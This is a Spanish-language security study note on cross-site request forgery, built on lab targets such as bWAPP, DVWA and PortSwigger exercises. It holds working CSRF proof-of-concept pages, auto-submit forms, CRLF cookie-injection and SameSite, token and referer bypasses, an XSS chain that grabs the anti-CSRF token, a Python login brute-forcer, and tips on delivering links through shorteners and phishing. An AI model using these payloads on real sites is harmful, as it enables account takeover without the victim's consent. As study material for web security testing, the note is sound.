# CSRF

## Table of contents

- [CSRF](#csrf)
  - [INDEX](#index)
  - [CONDICIONES PARA EL ATAQUE](#condiciones-para-el-ataque)
  - [SOP](#sop)
  - [MODO DE ATAQUE](#modo-de-ataque)
  - [EJEMPLOS](#ejemplos)
  - [Cómo entregar un exploit CSRF](#cmo-entregar-un-exploit-csrf)
  - [Incovenientes](#incovenientes)
  - [VERIFICACIONES](#verificaciones)
  - [MAS EJEMPLOS](#mas-ejemplos)
  - [CHAINING XSS + CSRF](#chaining-xss--csrf)
  - [PREVENCION](#prevencion)


## INTRODUCCION

La falsificación de solicitudes entre sitios (también conocida como CSRF) es una vulnerabilidad de seguridad web que permite a un atacante inducir a los usuarios a realizar acciones que no pretenden realizar. Permite a un atacante eludir parcialmente la misma política de origen, que está diseñada para evitar que diferentes sitios web interfieran entre sí. Básicamente en este ataque, el atacante **obliga a un usuario a ejecutar acciones no deseadas** en una aplicación web en la que está autenticado actualmente.

## IDENTIFICACION

Supongamos que una aplicación contiene una función que permite al usuario cambiar la dirección de correo electrónico en su cuenta. Cuando un usuario realiza esta acción, realiza una solicitud HTTP como la siguiente:

```http
POST /email/change HTTP/1.1  
Host: vulnerable-website.com  
Content-Type: application/x-www-form-urlencoded  
Content-Length: 30  
Cookie: session=yvthwsztyeQkAPzeQ5gHgTvlyxHfsAfE  
  
email=wiener@normal-user.com
```

Esto cumple con las condiciones requeridas para CSRF:

- **Una acción relevante:** La acción de cambiar la dirección de correo electrónico en la cuenta de un usuario es de interés para un atacante. Después de esta acción, el atacante normalmente podrá activar un restablecimiento de contraseña y tomar el control total de la cuenta del usuario.
- **Manejo de sesión basado en cookies:** La aplicación utiliza una cookie de sesión para identificar qué usuario emitió la solicitud. No existen otros tokens o mecanismos para realizar un seguimiento de las sesiones de los usuarios.
- **Sin parámetros de solicitud impredecibles:** El atacante puede determinar fácilmente los valores de los parámetros de solicitud necesarios para realizar la acción.

Con estas condiciones en su lugar, el atacante puede construir una página web que contenga el siguiente HTML:

```html
<html>  
  <body>  
    <form action="https://vulnerable-website.com/email/change" method="POST">  
      <input type="hidden" name="email" value="pwned@evil-user.net" />  
    </form>  
    <script>  
      document.forms[0].submit(); //importante! hacemos que se envie automaticamente
    </script>  
  </body>  
</html>
```

Si un usuario víctima visita la página web del atacante, sucederá lo siguiente:

-   La página del atacante activará una solicitud HTTP al sitio web vulnerable.
-   Si el usuario ha iniciado sesión en el sitio web vulnerable, su navegador incluirá automáticamente su cookie de sesión en la solicitud (suponiendo que no se estén utilizando  [cookies de SameSite](https://portswigger.net/web-security/csrf/samesite-cookies) ).
-   El sitio web vulnerable procesará la solicitud de la forma habitual, la tratará como si hubiera sido realizada por el usuario víctima y cambiará su dirección de correo electrónico.

## SOP

**SOP** es una abreviatura de **S** Ame- **O** rigin **P** olítica que es uno de los conceptos más importantes en el modelo de seguridad de aplicaciones web. Según esta política, un navegador web permite que los **scripts** **contenidos en una primera página web accedan a los datos de una segunda página web** , pero esto ocurre solo cuando ambas páginas web se ejecutan en el **mismo puerto, protocolo y origen** .

Por ejemplo:

Diga que la página web **"https://www.ignitetechnologies.com/ceh/module1.pdf"** puede acceder directamente al contenido en **"https://www.ignitetechnologies.com/network/RDP/module7.docx".*

Pero no puede acceder a los datos de **“https://www.ignitetechnologies.com:8080/bug/xss.pdf”.** Como el puerto se ha cambiado entre los dos ahora.

## MODO DE ATAQUE

Este ataque normalmente se realiza en apartados de cambios de contraseña, correo, realizar una transaccion o cualquiera que envie datos y por GET preferentemente pero se puede hacer basicamente con cualquier metodo.

## CASOS DE ATAQUE

### SIMPLE CSRF

Vamos a probar con la aplicacion vulnerable bWAPP:

**Caso cambio de secreto:**

En este caso se inercepto con burpsuite la peticion de cambio de secreto:

```http
POST /bWAPP/csrf_3.php HTTP/1.1
Host: 192.168.112.142
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 43
Origin: http://192.168.112.142
Connection: close
Referer: http://192.168.112.142/bWAPP/csrf_3.php
Cookie: PHPSESSID=ot2be2tmurfaeei6nkeiekh337; security_level=0
Upgrade-Insecure-Requests: 1

secret=hola+mundo&login=chris&action=change
```

Es una peticion post, si tiene el burpsuite professional pueden hacer click derecho a la peticion, seleccionar **Engagement tools** y escoger **Generate CSRF PoC**. Esto les creara un PoC para el ataque sino lo generan manualmente que es algo asi:

```html
<html>
	<body>
		<script>history.pushState('','','/')</script>
		<form action="http://192.168.112.142/bWAPP/csrf_3.php" method="POST">
			<input type="hidden" name="secret" value="" />
			<input type="hidden" name="login" value="chris" />
			<input type="hidden" name="action" value="change" />
			<input type="submit" value="Submit request" />
		</form>
	</body>
</html>
```

Esto lo hemos realizado nosotros en nuestra cuenta y esta con nuestros datos, debemos modificar el secreto con algo que nosotros queramos y de otro usuario valido de la web, quedando de la siguiente manera:

```html
<html>
	<body>
		<script>history.pushState('','','/')</script>
		<form action="http://192.168.112.142/bWAPP/csrf_3.php" method="POST">
			<input type="hidden" name="secret" value="evilsecret" />
			<input type="hidden" name="login" value="otro_usuario" />
			<input type="hidden" name="action" value="change" />
			<input type="submit" value="Submit request" />
		</form>
	</body>
</html>
```

Vemos que el action del form apunta al link de la pagina.

Esto es un PoC, pueden ustedes elaborar un html mas complejo y con otro formulario mas robusto para, mediante la ingenieria social, mandar esa pagina falsa y cuando el usuario haga click al boton de submit habremos cambiado su clave de ese usuario.

El usuario debe ya estar autenticado para que las cookies o sessions ID se carguen directamente a la peticion del atacante.

Ahora que pasa si estos datos viajan por metodo GET, es decir por la url de la pagina. Puedes probar esto mandando la peticion POST al repeater, darle click derecho y elegir **change method**, esto cambiara los datos poniendolos en la url y si lo mandas para analizar la respuesta del servidor puede que permita cambiar el secreto por GET como puede que no. Eso lo analizaras en la respuesta del servidor.

En caso de que deje se puede hacer la siguiente, en este caso no es necesario armar un formulario en HTML ya que los datos van por la url (pero tambien puedes usar el formulario lo veremos mas adelante):

```http
GET /bWAPP/csrf_3.php?secret=hola+mundo&login=chris&action=change HTTP/1.1
```

La url que servira para el ataque queda asi:

```http
http://192.168.112.142/bWAPP/csrf_3.php?secret=hola+mundo&login=chris&action=change
```

Es aqui donde nosotros cambiariamos los datos del secreto y el usuario y lo mandariamos a la victima.

Pero es muy descriptiva la url y la victima podria darse cuenta de que hace el link, por lo que se puede usar un recortador de url online como [shorturl](https://www.shorturl.at/).

Y la url cambiaria a esto:

```http
shorturl.at/ioLM1
```

Que es menos sospechosa que la anterior.

Tambien es valido usar el formulario de HTML sin el metodo POST especificado en el formulario:

```html
<html>
	<body>
		<script>history.pushState('','','/')</script>
		<form action="http://192.168.112.142/bWAPP/csrf_3.php">
			<input type="hidden" name="secret" value="evilsecret" />
			<input type="hidden" name="login" value="otro_usuario" />
			<input type="hidden" name="action" value="change" />
			<input type="submit" value="Submit request" />
		</form>
	</body>
</html>
```

### CSRF AUTO SUBMIT FORM

La siguiente funcionalidad de cambio de contraseña comple los requisitos para CSRF:

![[Pasted image 20230207145855.png]]

1. Se tiene una accion (Cambio de contraseña)
2. Manejo de sesiones por cookies, no se evidencia ninguna proteccion (anti-CSRF token)
3. Los parametros necesarios son claros y especificos (no hay valores adivinables)

vamos a generar una PoC cpon burpsuite professional:

![[Pasted image 20230207150515.png]]

Esto nos genera el siguiente payload:

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://0a20004c03c388e2c49fd3fe008d00c9.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hacker&#64;hack&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```

ahora para que este exploit se active automaticamente coloamos el siguiente codigo JS:

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://0a20004c03c388e2c49fd3fe008d00c9.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hacker&#64;hack&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
        document.forms[0].submit();
   </script>
  </body>
</html>
```

podemos automatizar esto seleccionando esta opcion:

![[Pasted image 20230207205258.png]]

### BYPASS CSRF TOKEN VALIDATION

#### Bypass CSRF Token with python

```python
#The code will extract the CSRF token from a page and initiate bruteforcing using common wordlist
import requests
from bs4 import BeautifulSoup

#Login bruteforcing using python
def brute_me(pwd,csrf_token,cookies):
    url_brute='http://localhost:8181/DVWA-master/vulnerabilities/brute/?username=admin&password='+pwd+'&Login=Login&user_token='+csrf_token
    r=requests.get(url=url_brute,cookies=cookies)
    if "password protected area" in r.text:
        return True

def generate_token():
    with open(r'C:\gitbased\SecLists\Passwords\Common-Credentials\10-million-password-list-top-10000.txt') as fh:
            for line in fh:
                url='http://localhost:8181/DVWA-master/vulnerabilities/brute/index.php'
                headers = {
                    'accept': 'text/html,application/xhtml+xml,application/xml',
                    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36',
                    'Host': 'localhost:8181'
                }
                cookies={'security':'high', 'security_level':'1', 'PHPSESSID':'m5qg9v3rjvrihb2sahdcab9a71'}
                r=requests.get(url=url,headers=headers,cookies=cookies)

                page_source = r.text

                soup = BeautifulSoup(page_source, "html.parser")

                csrf_token = soup.findAll(attrs={"name": "user_token"})[0].get('value')
                print csrf_token
                s=brute_me(str(line.strip()),csrf_token,cookies)
                if(s):
                    print "password Found" ,line
                    break




generate_token()
```

#### CSRF where token validation depends on request method

Puede darse el caso de que un formulario tengo una proteccion de token anti CSRF, pero este configurada bajo algunos metodos HTTP solamente.

puede que una accion tenga un token anti-CSRF:

![[Pasted image 20230207154746.png]]

si quitamos el parametro token nos muestra un mensaje de error:

![[Pasted image 20230207154839.png]]

esto no quiere decir que no se lo pueda obviar, podemos intentar cambiar el metodo HTTP a GET:

![[Pasted image 20230207155452.png]]

vemos que con este verbo si acepta la ausencia del token anti-CRSF. Podemos realizar la PoC para el ataque.

#### BYPASS CSRF TOKEN ELIMINANDO TODO EL PARAMETRO

En esta situación, el atacante puede eliminar todo el parámetro que contiene el token (no solo su valor) para eludir la validación y lanzar un ataque CSRF:

tenemos la misma respuesta

cuando se envia el token:

![[Pasted image 20230207203031.png]]

cuando no se envia:

![[Pasted image 20230207203102.png]]

con eso podemos continuar la PoC.

#### bypass token CSRF - no vinculado a la sesión del usuario

Algunas aplicaciones no validan que el token pertenezca a la misma sesión que el usuario que realiza la solicitud. En su lugar, la aplicación mantiene un grupo global de tokens que ha emitido y acepta cualquier token que aparezca en este grupo.

El atacante puede iniciar sesión en la aplicación con su propia cuenta, obtener un token válido y luego enviar ese token al usuario víctima en su ataque CSRF.

podemos obtener un token con un usuario:

![[Pasted image 20230207204830.png]]

podemos generar con otro:

![[Pasted image 20230207204855.png]]

si reemplazamos el token de una peticion a otra vemos que igual funciona, por lo que podemos armar una PoC de nuestra peticion con nuestra cuenta pero con el CSRF token de otra cuenta:

![[Pasted image 20230207205059.png]]

>[!note]
>Para obtener el token de otro usuario es necesario realizar la accion desde una pestaña incognita.

#### Bypass token CSRF está vinculado a una cookie que no es de sesión (CRLF Injection)

- [[CRLF Injection]]

Algunas aplicaciones vinculan el token CSRF a una cookie, pero no a la misma cookie que se usa para rastrear sesiones (antiCSRF-token).

Esto puede ocurrir fácilmente cuando una aplicación emplea dos "tokens" diferentes, uno para el manejo de sesiones y otro para la protección CSRF, que no están integrados entre sí:

![[Pasted image 20230207221400.png]]

- la cooike de sesion y el **csrfkey** no estan vinculadas.
- el **csrfkey** y el parametro **csrf** si lo estan.

estos 2 tokens estan vinculados, si quisieramos armar una PoC en este caso, no funcionara porque mandaremos el **antiCSRF-token** en nuestro paylod pero no tendra el **token adicional** que necesita para que lo acepte (**ya que estan vinculados**)

si la pagina es vulnerable a CRLF Injection podemos injectar una cookie, en este caso el **token adicional** que necesita para funcionar, el payload se armaria de la siguiente manera:

peticion original para armar la PoC:

![[Pasted image 20230207223601.png]]

hay un parametro que es vulnerable a **CRLF Injection**:

![[Pasted image 20230207230234.png]]

burpsuite professional lo detecta asi:

![[Pasted image 20230207230445.png]]

creacion del payload PoC:

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://0a3a00ac034cdb88c289fdd9008a007a.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test&#64;tes&#46;c" />
      <input type="hidden" name="csrf" value="vKD9Bl0rqwb1nMLeEXJNeyCMVW9vFiJG" />
      <input type="submit" value="Submit request" />
    </form>
    <img src="https://0a3a00ac034cdb88c289fdd9008a007a.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=EibA9wtyNOlltjutBnG4iNDJIldfDUyU%3b%20SameSite=None" onerror="document.forms[0].submit()">
  </body>
</html>
```

vamos a aprovechar una etiqueta **img** para inyectar la cookie `src="https://0a3a00ac034cdb88c289fdd9008a007a.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=EibA9wtyNOlltjutBnG4iNDJIldfDUyU%3b%20SameSite=None"` con nuestro **csrfkey** y como esto no carga una imagen y da error, en el evento **onerror** vamos a enviar el formulario directamente.

#### Bypass CSRF Token cuando se duplica en una cookie (CRLF Injection)

Algunas aplicaciones no mantienen ningún registro del lado del servidor de los tokens que se han emitido, sino que duplican cada token dentro de una cookie y un parámetro de solicitud. La aplicación simplemente verifica que el token enviado en el parámetro de solicitud coincida con el valor enviado en la cookie.

Se recomienda porque es simple de implementar y evita la necesidad de cualquier estado del lado del servidor.

>[!note]
>Al igual que el anterior ejemplo se tiene un parametro **search** vulnerable a **CRLF Injection**.

la aplicacion tiene un token csrf que se duplica en una cookie y verifica que sean iguales:

![[Pasted image 20230207231901.png]]

cuando no son iguales manda este mensaje:

![[Pasted image 20230207231935.png]]

como podemos inyectar una cookie, podemos colocar cualquier valor arbitrario pero que sean iguales:

PoC:

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://0a5600f1049cf9a4c0646dbb00df002f.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hate&#64;you&#46;c" />
      <input type="hidden" name="csrf" value="cualquier-valor" />
      <input type="submit" value="Submit request" />
    </form>
    <img src="https://0a5600f1049cf9a4c0646dbb00df002f.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=cualquier-valor%3b%20SameSite=None" onerror="document.forms[0].submit()">
  </body>
</html>

```

### BYPASS SAMESITE COOKIE RESTRICTIONS

#### QUE ES SAMESITE

SameSite es un mecanismo de seguridad del navegador que determina cuándo las cookies de un sitio web se incluyen en las solicitudes que se originan en otros sitios web. Las restricciones de cookies de SameSite brindan protección parcial contra una variedad de ataques entre sitios, incluidos CSRF, filtraciones entre sitios y algunas vulnerabilidades de [CORS](https://portswigger.net/web-security/cors)

La diferencia entre un sitio y un origen es su alcance; un sitio abarca varios nombres de dominio, mientras que un origen solo incluye uno.

![[Pasted image 20230208084851.png]]

ejemplo:

|**Solicitud de**|**Solicitud de**|**Mismo sitio?**|**Mismo origen?**|
|:------:|:--------:|:--------:|:-------:|
|`https://example.com`|`https://example.com`|Sí|Sí|
|`https://app.example.com`|`https://intranet.example.com`|Sí|No: nombre de dominio no coincidente|
|`https://example.com`|`https://example.com:8080`|Sí|No: puerto no coincidente|
|`https://example.com`|`https://example.co.uk`|No: eTLD no coincidente|No: nombre de dominio no coincidente|
|`https://example.com`|`http://example.com`|No: esquema no coincidente|No: esquema no coincidente|

Todos los principales navegadores actualmente admiten los siguientes niveles de restricción de SameSite:

-   [`Strict`](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions#strict)
-   [`Lax`](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions#lax)
-   [`None`](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions#none)

```bash
Set-Cookie: session=0F8tgdOhi9ynR1M9wa3ODa; SameSite=Strict
```

##### SAMESITE STRICT

Si una cookie se establece con el atributo `SameSite=Strict`, los navegadores no la enviarán en ninguna solicitud entre sitios. En términos simples, esto significa que si el sitio de destino de la solicitud no coincide con el sitio que se muestra actualmente en la barra de direcciones del navegador, **no incluirá la cookie**.

Esto se recomienda cuando se configuran cookies que permiten al portador modificar datos o realizar otras acciones confidenciales, como acceder a páginas específicas que solo están disponibles para usuarios autenticados.

Si bien esta es la opción más segura, puede afectar negativamente la experiencia del usuario en los casos en que se desea la funcionalidad entre sitios.

##### SAMESITE LAX

Si una cookie se establece con el atributo `SameSite=lax`, los navegadores enviarán la cookie en solicitudes entre sitios, pero solo si se cumplen las dos condiciones siguientes:

-   La solicitud utiliza el método `GET`.
-   La solicitud resultó de una navegación de nivel superior por parte del usuario, como hacer **clic en un enlace**.

Esto significa que la cookie no se incluye en las solicitudes `POST` entre sitios. Dado que las solicitudes`POST` generalmente se utilizan para realizar acciones que modifican datos o estados, es mucho más probable que sean el objetivo de ataques CSRF.

##### SAMESITE NONE

Si una cookie se configura con el atributo `SameSite=None`, esto deshabilita las restricciones de SameSite por completo, independientemente del navegador. Como resultado, los navegadores enviarán esta cookie en todas las solicitudes al sitio que la emitió, incluso aquellas que fueron activadas por sitios de terceros completamente no relacionados.

#### BYPASS SAMESITE LAX ATTRIBUTE

##### CSRF - BYPASS VIA METHOD OVERRIDE (ANULACION DEL METODO)

- Puede que encontremos un posible vector de ataque CSRF.
- Las cookies tienen la configuracion por defecto de **SameSite=Lax**.
- Y la peticion es un POST.

La configuracion Lax solo permite el envio de cookies a traves de **Peticiones GET**, por lo que al ser una peticion POST no podriamos explotar esto.

**_El primer paso es ver si podemos cambiar el metodo a GET y ver si funciona, pero caso contrario podemos intentar lo siguiente:_**

Algunos framework como **Symfony** admite el parámetro `_method` en formularios, que tiene prioridad sobre el método normal o establecido:

```html
<form action="https://vulnerable-website.com/account/transfer-payment" method="POST"> 
	<input type="hidden" name="_method" value="GET"> 
	<input type="hidden" name="recipient" value="hacker"> 
	<input type="hidden" name="amount" value="1000000"> 
</form>
```

>[!tip]
>Otros marcos admiten una variedad de parámetros similares.

**EJEMPLO**

puede que el metodo GET no este soportado:

![[Pasted image 20230208111829.png]]

descubrimos que la pagina usa **Symfony** entonces podemos agregar el parametro `_method` al final y dejarlo como metodo GET:

![[Pasted image 20230208112424.png]]

crearmos la siguiente carga util para la victima

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://0a7c00e8048926bcc031db49006800dd.web-security-academy.net/my-account/change-email" method="GET">
      <input type="hidden" name="_method" value="POST"> 
			<input type="hidden" name="email" value="hate&#64;you&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

##### CSRF - BYPASS VIA COOKIE REFRESH

Como se mencionó anteriormente, si un sitio web no incluye un atributo `SameSite` al configurar una cookie, Chrome aplica `Lax`restricciones automáticamente de forma predeterminada. Sin embargo, para evitar romper los mecanismos de inicio de sesión único (SSO) (por ejemplo **OAuth**), en realidad **no aplica estas restricciones durante los primeros 120 segundos** en las solicitudes `POST` de nivel superior. Como resultado, hay una ventana de dos minutos en la que los usuarios pueden ser susceptibles a ataques entre sitios.

Una vez que se actualizan las cookies ese valor de 120 segundos vuelve a correr, lo interesante aqui es que podemos refrescar las cookies de 2 formas:

1. Desde una nueva pestaña para que el navegador no abandone la página antes de que pueda realizar el ataque final. **Un inconveniente menor con este enfoque es que los navegadores bloquean las pestañas emergentes a menos que se abran mediante una interacción manual.**

```javascript
//recargar la pagina dsde una nueva pestaña
window.open('https://vulnerable-website.com/login/sso');
```

2. En caso de que este bloqueado las pestañas emergentes, podemos refrescar la pagina pero con un evento, por ejemplo **onclick** y colocarlo en toda la pagina para que apenas haga click **en cualquier lugar de la pagina** se active.

```javascript
window.onclick = () => { 
	window.open('https://vulnerable-website.com/login/sso'); 
}
```

>[!tip]
>Podemos hacer uso de la funcion **setTimeOut()** para que dentro de la funcion **onClick()** se mande directamente el formulario en un ataque de CSRF.

**EJEMPLO**

vemos que una pagina en su inicio de sesion usa SSO (OAuth):

![[Pasted image 20230208120347.png]]

![[Pasted image 20230208120501.png]]

![[Pasted image 20230208120541.png]]

entonces podemosusar esta tecnica, en la accion de cambio de contraseña solo acepta metodo **POST**, pero podemos hacer la actualizacion de cookies para evadir el samesite:

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://0a10008903710d82c2668f7100db00e2.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hack&#64;you&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
    //onclick para evadir ventanas emergentes
    window.onclick = () => {
        window.open('https://0a10008903710d82c2668f7100db00e2.web-security-academy.net/social-login'); //abrimosla pagina del login OAth para refrescar cookies
        
        //despues de 5 segundo se auto envia el formulario
        setTimeout(changeEmail, 5000);
    }

	//funcion de auto envio de formulario CSRF
    function changeEmail() {
        document.forms[0].submit();
    }
</script>
  </body>
</html>
```

#### BYPASS SAMESITE STRICT ATTRIBUTE

##### CSRF - BYPASS VIA CLIENT-SIDE REDIRECTION



##### CSRF - BYPASS VIA SIBLINGS DOAMIN (DOMINIOS HERMANOS)

### BYPASS REFERER-BASED CSRF

#### REFERER HEADER

Además de las defensas que emplean tokens CSRF, algunas aplicaciones utilizan el `Referer`encabezado HTTP para intentar defenderse de los ataques CSRF, normalmente al verificar que la solicitud se originó en el propio dominio de la aplicación.

#### Validación de Referer depende de que el encabezado esté presente

Algunas aplicaciones validan el header `Referer` cuando está presente en las solicitudes, pero omiten la validación si se omite el encabezado.

En esta situación, un atacante puede crear su exploit CSRF de una manera que haga que el navegador del usuario de la víctima no envie (refleje) el  header `Referer` en la solicitud resultante. Hay varias formas de lograr esto, pero la más fácil es usar una etiqueta META dentro de la página HTML que alberga el ataque CSRF:

```html
<meta name="referrer" content="never">
```

entonces a la hora de crear noestra PoC, debemos agregar esta etiqueta:

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <meta name="referrer" content="never">
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://0a1d00bd049db823c11812b7007900c9.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hack&#64;you&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

#### CSRF con broken Referer validation

Algunas aplicaciones validan el header `Referer` de una manera ingenua que se puede omitir. Por ejemplo, si la aplicación valida que el dominio en el `Referer` comience con el valor esperado, entonces el atacante puede colocar esto como un subdominio de su propio dominio:

```bash
http://vulnerable-website.com.attacker-website.com/csrf-attack
```

Del mismo modo, si la aplicación simplemente valida que `Referer` contenga su propio nombre de dominio, el atacante puede colocar el valor requerido en otra parte de la URL:

```bash
http://attacker-website.com/csrf-attack?vulnerable-website.com
```

**Puede anular este comportamiento asegurándose de que la respuesta que contiene su exploit tenga el header `Referrer-Policy: unsafe-url`**

**EJEMPLO**

una accion de cambio de contraseña tiene una validacion del header referer, valida de que el dominio este su valor:

![[Pasted image 20230208164802.png]]

si le agregamos al dominio como un parametro GET ya nos acepta:

![[Pasted image 20230208164852.png]]

entonces la PoC quedaria asi:

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/?0aad00fb03ccd03ec395b08900b100b2.web-security-academy.net')</script>
    <form action="https://0aad00fb03ccd03ec395b08900b100b2.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hack&#64;you&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

agregamos el parametro GET en el tercer valor del **pushState()**:

```html
<script>history.pushState('', '', '/?0aad00fb03ccd03ec395b08900b100b2.web-security-academy.net')</script>
```

>[!note]
>Muchos navegadores ahora eliminan la cadena de consulta del encabezado Referer de forma predeterminada como medida de seguridad. Para anular este comportamiento y asegurarse de que la URL completa se incluya en la solicitud, vuelva al servidor de explotación y agregue el siguiente header `Referrer-Policy: unsafe-url`.

![[Pasted image 20230208165534.png]]

## Cómo entregar un exploit CSRF

- Puede ser mediante un XSS reflejado para que se envie automaticamente el formulario.
- Se puede crear un cortador de URL para que la url original no genere desconfianza.
- Phishing

## Incovenientes

A veces para los formularios de cambio de contraseña, para realizar el ataque de CSRF se necesita conocer la contraseña actual del usuario porque algunas paginas lo piden para actualizar la password. 

## MAS EJEMPLOS

Petición GET que require interacción. Con un botón.

```html
<a href="http://www.example.com/api/setusername?username=CSRFd">Click Me</a>
```

Petición GET que **no** require interacción. Ver una imagen.

```html
<img src="http://www.example.com/api/setusername?username=CSRFd">
```

Petición POST que require interacción. Con un botón de formulario.

```html
<form action="http://www.example.com/api/setusername" enctype="text/plain" method="POST">
 <input name="username" type="hidden" value="CSRFd" />
 <input type="submit" value="Submit Request" />
</form>
```

Petición POST que **no** require interacción. Autosubmit.

```html
<form id="autosubmit" action="http://www.example.com/api/setusername" enctype="text/plain" method="POST">
 <input name="username" type="hidden" value="CSRFd" />
 <input type="submit" value="Submit Request" />
</form>
 
<script>
 document.getElementById("autosubmit").submit();
</script>
```

Peticion POST simple cuando se trata de un APIRest:

```javascript
<script>
var xhr = new XMLHttpRequest();
xhr.open("GET", "http://www.example.com/api/currentuser");
xhr.send();
</script>
```

Peticion GET simple cuando se trata de un APIRest:

```javascript
<script>
var xhr = new XMLHttpRequest();
xhr.open("GET", "http://www.example.com/api/currentuser");
xhr.send();
</script>
```

Peticion POST con credenciales cuando se trata de un APIRest:

```javascript
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://www.example.com/api/setrole");
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
xhr.send('{"role":admin}');
</script>
```

## CHAINING XSS + CSRF

Las solicitudes maliciosas entre sitios están fuera de la ecuación debido a las protecciones del mismo origen/mismo sitio. Todavía podemos realizar un ataque CSRF a través de la vulnerabilidad XSS almacenada que existe. Específicamente, aprovecharemos la vulnerabilidad XSS almacenada para emitir una solicitud de cambio de estado contra la aplicación web. ¡Una solicitud a través de XSS omitirá cualquier protección del mismo origen/mismo sitio ya que se derivará del mismo dominio!

Payload XSS:

```javascript
<script>
//primera peticion para obtener el CSRF token
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/app/change-visibility',true);
req.send();
function handleResponse(d) {
	//recuperacion del CSRF Token
    var token = this.responseText.match(/name="csrf" type="hidden" value="(\w+)"/)[1];

	//segunda peticion para realizar el Ataque CSRF pasando el Anti CSRF-Token
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/app/change-visibility', true);
    changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    changeReq.send('csrf='+token+'&action=change');
};
</script>
```

Como estamos aprovechando una vulnerabilidad XSS almacenada, al momento de ejecutarse o llamarse realizara una accion dentro de la cuenta del usuario (**Si se encuentra logueado**) sin su consentimiento.

## Explotación de tokens CSRF débiles

Al evaluar la solidez de un mecanismo de generación de tokens CSRF, asegúrese de dedicar un poco de tiempo a intentar encontrar el mecanismo de generación de tokens CSRF. Puede ser tan fácil como:

- `md5(username)`
- `sha1(username)`
- `md5(current date + username)`

Tenga en cuenta que no debe dedicar mucho tiempo a esto, pero vale la pena intentarlo.

## Additional CSRF Protection Bypasses

### Null Value

Puede intentar convertir el token CSRF en un valor nulo (vacío), por ejemplo:

```bash
CSRF-Token:
```

### Random CSRF Token

Establecer el valor del token CSRF en la misma longitud que el token CSRF original pero con un valor diferente/aleatorio también puede omitir alguna protección anti-CSRF que valida si el token tiene un valor y la longitud de ese valor. Por ejemplo, si el token CSRF tuviera una longitud de 32 bytes, volveríamos a crear un token de 32 bytes.

Verdadero:

`CSRF-Token: 9cfffd9e8e78bd68975e295d1b3d3331`

Falso:

`CSRF-Token: 9cfffl3dj3837dfkj3j387fjcxmfjfd3`

### Utilizar el token CSRF de otra sesión

Cree dos cuentas e inicie sesión en la primera cuenta. Genere una solicitud y capture el token CSRF. Copie el valor del token, por ejemplo, `CSRF-Token=9cfffd9e8e78bd68975e295d1b3d3331`.

### Manipulación del método de solicitud

- Para eludir las protecciones anti-CSRF, podemos intentar cambiar el método de solicitud. De _POST_ a _GET_ y viceversa.

### Elimine el parámetro del token CSRF o envíe un token en blanco

- No enviar un token funciona con bastante frecuencia debido al siguiente error común de lógica de aplicación. A veces, las aplicaciones solo verifican la validez del token si el token existe o si el parámetro del token no está en blanco.

### Protección anti-CSRF a través del encabezado de referencia

Si una aplicación utiliza el encabezado de referencia como mecanismo anti-CSRF, puede intentar eliminar el encabezado de referencia. Agregue la siguiente metaetiqueta a su página que aloja su script CSRF.

`<meta name="referrer" content="no-referrer"`

## PREVENCION

La forma más sólida de defenderse contra los ataques CSRF es incluir un [token CSRF](https://portswigger.net/web-security/csrf/tokens) dentro de las solicitudes relevantes. La ficha debe ser:

-   Impredecible con alta entropía, como para tokens de sesión en general.
-   Vinculado a la sesión del usuario.
-   Estrictamente validado en todos los casos antes de ejecutar la acción correspondiente.

